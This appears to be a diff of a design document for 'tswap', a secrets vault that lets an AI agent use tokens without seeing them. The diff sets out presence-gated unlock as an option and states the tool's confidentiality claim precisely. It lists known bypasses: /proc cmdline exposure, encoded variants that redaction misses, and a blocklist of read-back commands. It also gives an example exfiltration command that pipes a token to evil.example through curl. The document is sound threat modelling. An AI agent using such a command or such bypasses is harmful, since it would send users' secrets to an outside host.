@@ -60,32 +60,49 @@ tells the agent to use `run` for `{{token}}` substitution "without seeing them" 
 - **#106** — streaming redaction misses encoded/escaped variants.
 - **#71** — secrets substituted into argv are readable from `/proc/<pid>/cmdline` by the very
   agent being mediated.
-- **#164** — TPM must require user interaction to unlock, and specifically **presence, not a PIN**.
-  Today a TPM vault unseals for any process running as that user, including the agent — the one
-  configuration where the core claim has no hardware enforcement behind it, only a sudo boundary
-  that `run` deliberately doesn't cross. tswap unlocks once per invocation and an agent invokes
-  `run` continuously, so consent has to be touch-grade: a PIN typed every few seconds gets
-  disabled, cached, or abandoned, and each of those defeats the tool.
+- **#164** — optional presence-gated unlock for TPM via Windows Hello. An **option, not a gate**
+  (see below).
 
-**Presence is available on every platform without inventing anything**, and the segmentation is
-complementary — the platforms with built-in presence are the ones whose users are least likely to
-buy a token:
+### Two properties, kept apart
 
-| Platform | Presence mechanism | Cost |
-|---|---|---|
-| macOS | Secure Enclave + Touch ID | Free, built in — already implemented |
-| Windows | Windows Hello, TPM-backed | Free on most modern hardware — #164 |
-| Linux | Touch-required YubiKey | A purchase, but this population already buys them |
+The enforcement items above are all about **confidentiality** — can the agent *see* the plaintext.
+That is the guarantee `AGENTS.md:7` actually claims, and the mediation layer is what enforces it.
 
-So the Linux TPM presence problem is **closed by scoping, not by building**: no Wayland prompt app,
-no polkit/`systemd-ask-password` integration, no fprintd work. Linux TPM keeps a coherent role —
-unattended and CI contexts, where presence is impossible by definition and the real threat is disk
-theft, which sealing genuinely addresses.
+**Capability** — can the agent *cause* a secret to be used — is a different property, gated by
+presence (touch, Touch ID, Windows Hello). And the agent being able to unlock is **the feature, not
+the threat**: an agent that cannot unlock cannot do its job. Automated and unattended workflows are
+legitimate and increasingly the common case, and a vault without presence is not broken — the agent
+still cannot read cleartext, because something else enforces that.
 
-The uniform rule #164 establishes: **any backend configuration without per-unlock human interaction
-is not agent-safe, and is for unattended/CI use only** — covering no-touch YubiKey (`ykman otp
-chalresp --generate 2`) as well as PIN-less TPM. `AGENTS.md` already draws that line for the
-YubiKey case; apply it consistently.
+So presence is a **mode**, chosen per deployment:
+
+- **Attended** — developer at the machine. Presence adds defence in depth and a per-unlock consent
+  signal. Available free on macOS (Secure Enclave, already implemented), free on most Windows
+  hardware (Hello, #164), and via a touch-required YubiKey on Linux — a purchase, but that
+  population already buys them.
+- **Unattended** — CI, automation, background agents. Presence is impossible by definition and the
+  mediation layer is the sole control. Supported deliberately, reported factually by `slots`/`init`
+  without implying it is unsafe.
+
+**Linux needs nothing built** for this: no Wayland prompt app, no polkit/`systemd-ask-password`
+integration, no fprintd work. All were incomplete — none closes prompt forgery, since Wayland has
+no secure attention sequence — and all deliver a typed PIN, which is unusable at tswap's access
+frequency (unlock runs once per invocation; an agent invokes `run` continuously).
+
+Because presence is optional, the unattended path makes the mediation layer the *only* control —
+which is why #105/#106/#71 lead this milestone rather than trail it.
+
+### One limit to state honestly
+
+The blocklist is `echo, printf, cat, env, printenv, set, tee` (`Validation.cs:14-15`) checked
+against `argv[0]`, plus a pipe/redirect block. That stops the agent reading a secret back. It does
+not stop an authorized use from being malicious: `tswap run -- curl -d {{token}} evil.example`
+passes every current check. Presence does not close it either — a human cannot tell a legitimate
+use from an exfiltrating one.
+
+The claim to make is therefore precise: **the agent does not learn the secret value** — it never
+enters the agent's context, logs or output, so it cannot be retained, reused, or shipped to a model
+provider. Not "an authorized command can never misuse the secret it was given."
 
 ### Reach — Secure Enclave and TPM must be first-class
 
